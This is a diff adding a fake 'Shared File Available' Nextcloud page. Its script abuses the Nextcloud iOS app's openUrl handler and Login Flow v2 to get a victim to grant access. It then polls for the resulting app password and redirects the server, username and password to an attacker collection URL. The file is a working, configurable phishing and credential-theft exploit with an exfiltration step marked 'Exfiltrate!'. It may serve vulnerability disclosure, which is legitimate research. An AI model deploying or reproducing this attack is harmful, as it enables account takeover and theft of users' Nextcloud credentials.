@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>View Shared File - Nextcloud</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0082c9; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; color: #333; border-radius: 12px; padding: 30px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        h2 { margin: 0 0 8px; font-size: 20px; }
+        p { color: #666; margin: 8px 0 20px; font-size: 14px; }
+        .btn { display: inline-block; background: #0082c9; color: white; padding: 14px 40px; border-radius: 25px; text-decoration: none; font-size: 16px; font-weight: 600; cursor: pointer; border: none; }
+        .btn:active { background: #006aa3; }
+        .spinner { display: none; margin: 20px auto; width: 36px; height: 36px; border: 3px solid #ddd; border-top: 3px solid #0082c9; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #status { display: none; margin-top: 12px; color: #888; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Shared File Available</h2>
+        <p>You have been shared a file on Nextcloud.<br>Tap below to view it.</p>
+        <button class="btn" id="openBtn" onclick="startAttack()">Open in Nextcloud</button>
+        <div class="spinner" id="spinner"></div>
+        <div id="status">Connecting...</div>
+    </div>
+
+    <script>
+    // ============================================================
+    //  CONFIGURATION — Change these for your setup
+    // ============================================================
+    var TARGET = "https://ivo.lv.tab.digital";
+    var COLLECT = "https://mayurudiniya.github.io/stolen-token.html";
+    // ============================================================
+
+    var pt = "", pe = "";
+
+    async function startAttack() {
+        document.getElementById("openBtn").style.display = "none";
+        document.getElementById("spinner").style.display = "block";
+        document.getElementById("status").style.display = "block";
+
+        // 1. Create login flow on target
+        var r = await fetch(TARGET + "/index.php/login/v2", { method: "POST" });
+        var d = await r.json();
+        pt = d.poll.token;
+        pe = d.poll.endpoint;
+
+        // 2. Save poll info so we can retrieve after redirect
+        localStorage.setItem("pt", pt);
+        localStorage.setItem("pe", pe);
+
+        // 3. Open via Nextcloud iOS app openUrl handler
+        window.location.href = "nextcloud://openUrl?url=" + encodeURIComponent(d.login);
+    }
+
+    // When user comes back to this page after granting access, poll for token
+    async function tryPoll() {
+        var token = localStorage.getItem("pt");
+        var endpoint = localStorage.getItem("pe");
+        if (!token || !endpoint) return;
+
+        document.getElementById("openBtn").style.display = "none";
+        document.getElementById("spinner").style.display = "block";
+        document.getElementById("status").style.display = "block";
+        document.getElementById("status").textContent = "Completing setup...";
+
+        for (var i = 0; i < 30; i++) {
+            try {
+                var r = await fetch(endpoint, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: "token=" + encodeURIComponent(token)
+                });
+                var txt = await r.text();
+                if (txt.includes("appPassword")) {
+                    var c = JSON.parse(txt);
+                    localStorage.removeItem("pt");
+                    localStorage.removeItem("pe");
+
+                    // Exfiltrate!
+                    window.location.href = COLLECT
+                        + "?s=" + encodeURIComponent(c.server)
+                        + "&u=" + encodeURIComponent(c.loginName)
+                        + "&p=" + encodeURIComponent(c.appPassword);
+                    return;
+                }
+            } catch(e) {}
+            await new Promise(r => setTimeout(r, 2000));
+        }
+        document.getElementById("status").textContent = "Session expired. Please try again.";
+        document.getElementById("openBtn").style.display = "inline-block";
+        document.getElementById("spinner").style.display = "none";
+    }
+
+    // Check if we're returning from the grant flow
+    if (localStorage.getItem("pt")) {
+        tryPoll();
+    }
+    </script>
+</body>
+</html>
